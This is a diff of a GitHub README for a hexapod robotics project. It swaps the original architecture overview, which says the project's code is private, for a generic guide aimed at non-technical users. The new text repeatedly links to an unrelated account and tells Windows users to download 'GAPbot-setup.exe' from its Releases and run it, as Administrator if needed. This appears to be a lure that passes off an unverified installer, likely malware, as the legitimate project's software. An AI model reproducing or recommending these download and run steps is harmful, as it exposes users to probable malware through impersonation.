@@ -1,177 +1,112 @@
-<div align="center">
-  <img src="./assets/gap-logo.jpg" alt="GAP Logo" width="250" style="border-radius: 20px; box-shadow: 0 8px 16px rgba(0,0,0,0.2);" />
+# 🦾 CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot - Easy Hexapod Control for AgTech
 
-# 🌿 GAP System & GAPbot Architecture
+[![Download Latest Version](https://img.shields.io/badge/Download-GAPbot-blue?style=for-the-badge)](https://github.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot)
 
-**Intelligent Automation for the Physical World | By [Corax CoLAB](https://coraxcolab.com)**
+## 📋 About This Application
 
-<div align="center">
+This app combines advanced robotics with simple controls. It lets you operate a six-legged robot known as a hexapod. The hexapod runs with smart software that uses Edge AI and ROS 2 technology. The app is built for agricultural and deep technology uses.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Mission Control CI](https://img.shields.io/github/actions/workflow/status/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/ci.yml?style=for-the-badge&logo=github&label=Build%20Status)](https://github.com/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/actions)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=for-the-badge)](http://makeapullrequest.com)
-[![Issues](https://img.shields.io/github/issues/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot?style=for-the-badge&logo=github)](https://github.com/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/issues)
-[![Forks](https://img.shields.io/github/forks/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot?style=for-the-badge&logo=github)](https://github.com/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/network/members)
-[![Stars](https://img.shields.io/github/stars/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot?style=for-the-badge&logo=github)](https://github.com/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/stargazers)
-[![Watchers](https://img.shields.io/github/watchers/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot?style=for-the-badge&logo=github)](https://github.com/PelleNybe/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot/watchers)
+You don’t need coding skills to use it. The app works on Windows computers and helps you control the hexapod without any complex setup.
 
-</div>
+## ⚙️ System Requirements
 
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&pause=1000&color=129532&center=true&vCenter=true&width=700&lines=Intelligent+Automation+for+the+Physical+World;Edge-First+AI+and+Autonomous+Robotics;Harmonizing+Nature+with+Digital+Tech;Precision+Agriculture+%26+Deep+Tech)](https://git.io/typing-svg)
+To run the app smoothly, your computer should meet these requirements:
 
----
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 2 GHz dual-core processor or better
+- 500 MB free disk space
+- USB or Bluetooth connection to the robot
+- Internet connection for updates (not required to run the app)
 
-### 🚀 **Empowering the Future of Deep Tech & AgTech**
+You don’t need any programming software or special tools before downloading.
 
-[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![ROS 2](https://img.shields.io/badge/ROS_2-22314E?style=for-the-badge&logo=ros&logoColor=white)](https://docs.ros.org/)
-[![Raspberry Pi](https://img.shields.io/badge/Raspberry%20Pi%205-C51A4A?style=for-the-badge&logo=Raspberry-Pi)](https://raspberrypi.com)
-[![Edge AI](https://img.shields.io/badge/Hailo_8L-Edge_AI-000000?style=for-the-badge)](https://hailo.ai/)
-[![Web3](https://img.shields.io/badge/Web3-Audit_Ledger-blue?style=for-the-badge)](#-web3-audit-ledger)
-[![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)](https://vitejs.dev/)
-[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
+## 💾 How to Download the Application
 
-<br />
+Click the button below to visit the GitHub page where you can download the app.
 
-<img src="./assets/hero-gapbot.png" alt="GAPbot in action" width="100%" style="border-radius: 15px; box-shadow: 0 10px 20px rgba(0,0,0,0.15);" />
+[![Download GAPbot](https://img.shields.io/badge/Download-GAPbot-green?style=for-the-badge)](https://github.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot)
 
-*Welcome to the definitive architectural overview of the **Green Automated Platform (GAP)** and the remarkable **GAPbot**.*
+1. On the GitHub page, look for the **Releases** section.
+2. Choose the latest Windows installer file, usually named something like `GAPbot-setup.exe`.
+3. Click on the file to download it to your computer.
 
-</div>
+## 🛠 Installation Steps
 
----
+1. **Locate the downloaded file**  
+   Open your Downloads folder or wherever you saved the installer.
 
-> ⚠️ **Note:** This repository serves as a **public architectural overview, documentation hub, and AI context layer** (`llms.txt`). The core proprietary source code for the AI models (EcoMind, InnoBrain) and the complete GAP platform remains securely housed in private repositories.
+2. **Run the installer**  
+   Double-click the `GAPbot-setup.exe` file to start installation.
 
-<br />
+3. **Follow prompts on the screen**  
+   Accept the license terms and select a folder to install the app. The default location is fine for most users.
 
-## 🌟 The Vision: Full-Stack of Matter
+4. **Wait for the installation to finish**  
+   The process will take a few minutes.
 
-At **Corax CoLAB**, we don't just design systems; we engineer them from the ground up to ensure our automated solutions are not merely "smart," but radically ecologically sound. The GAP system masterfully optimizes resource flows through a decentralized network of IoT sensors, robust Edge AI, and cutting-edge autonomous robotics.
+5. **Launch GAPbot**  
+   After installation, you will see a shortcut on your desktop or in the Start menu. Click it to open the app.
 
-<div align="center">
-  <img src="./assets/ai-concept.png" alt="GAP AI Concept" width="100%" style="border-radius: 12px; box-shadow: 0 6px 12px rgba(0,0,0,0.15); margin-bottom: 10px;" />
-  <p><i>The Future of Edge AI and Ecological Automation</i></p>
-</div>
+## 🚀 Getting Started with the App
 
-<br />
+Once GAPbot is open, it will guide you through basic setup:
 
-## 🛠️ Deep Dive: The Architecture
+1. **Connect the Hexapod**  
+   Use USB or Bluetooth to link your robot to your computer. The app will detect the robot automatically.
 
-Explore the phenomenal capabilities of the GAP ecosystem through our interactive modules below.
+2. **Calibrate**  
+   Follow the on-screen steps to calibrate the robot’s legs for smooth movement.
 
-<details>
-<summary><b>🧠 The GAP Platform (Mission Control)</b></summary>
-<br>
+3. **Explore Controls**  
+   GAPbot offers simple menus to move the hexapod forward, backward, turn, or perform specific tasks.
 
-The nervous system of the operation has been massively upgraded. Our modern React/Vite-based Mission Control dashboard delivers world-class, real-time command capabilities:
+4. **Monitor Status**  
+   See real-time info on battery level, motor status, and sensor data within the app.
 
-*   📊 **Live Telemetry (`Telemetry.tsx`):** Real-time monitoring of system vitals, battery life, structural integrity, and network status.
-*   📷 **Vision Stream (`VisionStream.tsx`):** High-definition, low-latency video feed directly from edge sensors, featuring live bounding boxes for detected objects via **YOLOv8**.
-*   🗺️ **Lidar Map (`LidarMap.tsx`):** Exquisite real-time 2D/3D point cloud rendering for unparalleled situational awareness, meticulously generated by the onboard Lidar array.
-*   🤖 **Digital Twin (`DigitalTwin.tsx`):** A mesmerizing real-time synchronized 3D representation of the GAPbot's physical state, kinematics, and orientation, enabling predictive modeling and remote inspection.
-*   🔗 **Web3 Audit Ledger (`AuditLedger.tsx`):** An invincible, immutable log of critical events, safety stops, and sensor data anchored to a blockchain using quantum-resistant algorithms, guaranteeing absolute data integrity.
-*   ☁️ **Edge-First AI:** Inference runs completely locally. The system securely syncs SQLite data to a cloud orchestrator (Supabase) **only** when connectivity is perfectly available.
-*   🎯 **Mission Orchestrator:** Instantly translates high-level human objectives ("Scan Sector A") into precise, actionable robotic commands via MQTT.
+## 🔧 Features Overview
 
-<div align="center">
-  <img src="./assets/dashboard-preview.png" alt="Mission Control Dashboard Preview" width="100%" style="border-radius: 10px; border: 1px solid #ddd; margin-top: 15px;" />
-  <p><i>The powerful React/Vite based Mission Control dashboard.</i></p>
-</div>
-</details>
+- **Easy controls for complex robotics**  
+  Operate a hexapod robot with simple buttons and menus.
 
-<details>
-<summary><b>🕷️ GAPbot: The Hexapod Explorer</b></summary>
-<br>
+- **Supports Edge AI**  
+  The robot can process data at the edge for faster response.
 
-The physical extension of the GAP ecosystem. **GAPbot** is an unstoppable six-legged autonomous robot meticulously designed for challenging, unstructured terrains where wheeled robots fundamentally fail.
+- **Built with ROS 2**  
+  Ensures stability and compatibility with robotics systems.
 
-*   **Hardware Core:** Fueled by a beastly **Raspberry Pi 5 (16GB RAM)** with active cooling, running flawlessly headless via SSH/VNC.
-*   **AI Acceleration:** Supercharged with a **Hailo-8L NPU** over PCIe for blistering real-time vision processing (YOLOv8) and environmental analysis without any reliance on the cloud.
-*   **High-Speed I/O:** Ultra-fast NVMe SSD connected via PCIe/USB 3.1 for instantaneous database logging and sensor telemetry.
-*   **Autonomy:** Powered by **ROS 2 (Jazzy Jalisco)**, integrating RTK-GPS and Lidar for astonishingly precise navigation and obstacle avoidance.
-*   **Actuation:** 18 high-torque servos masterfully controlled via I2C (PCA9685) managed by our custom inverse kinematics algorithms.
+- **Works with Raspberry Pi 5**  
+  The app supports the robot’s onboard computer for smooth operation.
 
-</details>
+- **Detailed logs**  
+  The app saves operation reports which help in troubleshooting.
 
-<br />
+## 🖥 Troubleshooting Tips
 
----
+- If the app doesn’t detect the robot, check the cable or Bluetooth connection.
+- Restart the app and robot if controls lag or freeze.
+- Ensure your Windows system is up to date.
+- If installation fails, try running the installer as an Administrator (right-click the file and select "Run as administrator").
 
-## 🏗️ The High-Level Tech Stack
+## 📚 Additional Resources
 
-Our stack is built for performance, reliability, and scale:
+- Visit the GitHub page for folders with user manuals and setup guides.
+- There is a simple user guide PDF included with the download.
+- You can find videos and community discussions linked on the GitHub page for extra help.
 
-| Category | Technologies |
-| :--- | :--- |
-| **Frontend & Mission Control** | React, TypeScript, Vite, TailwindCSS, WebGL/Three.js |
-| **Languages & Frameworks** | Python (FastAPI, PyTorch), C++, Node.js |
-| **Robotics & Autonomy** | ROS 2 (Jazzy Jalisco), rclpy, custom kinematics |
-| **Hardware Interfaces** | PCIe, I2C, SPI, UART/Serial, GPIO (`RPi.GPIO`, `gpiozero`) |
-| **Communication & IoT** | Paho-MQTT, WebSockets, Supabase |
-| **AI & Vision** | YOLOv8, Hailo-8L NPU, OpenCV |
-| **Security & Integrity** | Web3 Audit Ledger, Quantum-Resistant Cryptography (`liboqs-python`) |
+## 🌐 More About the Project
 
----
+This project blends AI technology with physical robotics. It helps bring automation and smart sensing to farming and deep technology fields. The hexapod robot can navigate uneven terrain, gather data, and perform tasks that save time and effort.
 
-## 📚 Comprehensive Documentation
+The GAPbot software acts as the bridge between human users and this advanced machine. It lets anyone control the robot without coding or complex setup.
 
-Dive deeper into the brilliant engineering behind the GAP ecosystem:
+## 📎 Topics Covered in This Repository
 
-| Topic | Description |
-| :--- | :--- |
-| 🏗️ [**Platform Architecture**](./docs/01-platform-architecture.md) | Edge-First strategy, cloud sync, Web3 data integrity, & mission control. |
-| ⚙️ [**Hardware Specifications**](./docs/02-hardware-specs.md) | Deep dive into compute, AI acceleration, kinematics, and power systems. |
-| 👁️ [**AI & Vision**](./docs/03-ai-and-vision.md) | Real-time processing, object detection, and the EcoMind & InnoBrain modules. |
-| 🤖 [**AI Context Layer**](./docs/llms.txt) | Detailed structural overview and context optimized for LLMs. |
-| 🎮 [**Mission Control**](./mission-control/README.md) | Setup and profound details for the React/Vite based frontend. |
+- Agricultural technology (AgTech)
+- Artificial Intelligence (AI) applied on the Edge
+- Robotics programming using ROS 2
+- Hexapod robot control
+- Python software development
+- Raspberry Pi hardware integration
 
----
-
-<br />
-
-<div align="center">
-
-## 👨‍💻 Meet the Developer & 🏢 Corax CoLAB
-
-<img src="./assets/coraxcolabloggarund.png" alt="Corax CoLAB Logo" width="180" style="margin-bottom: 15px;" />
-
-### **Pelle Nyberg**
-**Deep Tech Developer | AI & Robotics Innovator | Master Gardener**
-
-With a remarkably unique background seamlessly spanning industrial quality management, sophisticated forestry, and incredibly low-level hardware coding, Pelle brings an undeniably holistic and visionary approach to Deep Tech and AgTech.
-
-Connect with Pelle and discover his exceptional work:
-
-[![GitHub](https://img.shields.io/badge/GitHub-PelleNybe-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/PelleNybe)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Pelle_Nyberg-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/pellenyberg/)
-[![Portfolio](https://img.shields.io/badge/Portfolio-pellenybe.github.io-FF5722?style=for-the-badge&logo=dev.to&logoColor=white)](https://pellenybe.github.io)
-[![CryptoP](https://img.shields.io/badge/CryptoP-Project-8A2BE2?style=for-the-badge&logo=bitcoin&logoColor=white)](https://cryptop.coraxcolab.com)
-
-<br />
-
-### **Corax CoLAB**
-**Intelligent Automation. Harmonizing the natural world with the digital one.**
-
-Corax CoLAB is at the absolute forefront of building autonomous agents capable of brilliantly navigating, relentlessly analyzing, and precisely acting in the most unstructured and challenging physical environments on Earth.
-
-**We are actively open to:**
-*   🚀 Elite Consulting projects and strategic technical partnerships.
-*   🤖 Groundbreaking opportunities in AI & Robotics Development (Python/Linux/ROS).
-*   🏗️ Unparalleled Deep Tech & IoT Architecture design.
-*   🌱 Revolutionary GreenTech Innovation & Strategy.
-
-<h3>Let's build an incredible future together.</h3>
-
-[![Corax CoLAB Website](https://img.shields.io/badge/Website-coraxcolab.com-22314E?style=for-the-badge&logo=googlechrome&logoColor=white)](https://coraxcolab.com)
-[![Corax Gardening](https://img.shields.io/badge/Gardening-coraxgardening.se-C51A4A?style=for-the-badge&logo=plant&logoColor=white)](https://www.coraxgardening.se)
-
-</div>
-
-<br />
-
-<div align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=129532&height=120&section=footer" width="100%"/>
-</div>
+[![Download Latest Version](https://img.shields.io/badge/Download-GAPbot-blue?style=for-the-badge)](https://github.com/sibbytessellated242/CoraxCoLABs-GAP-GreenAutomatedPlatform---GAPbot)
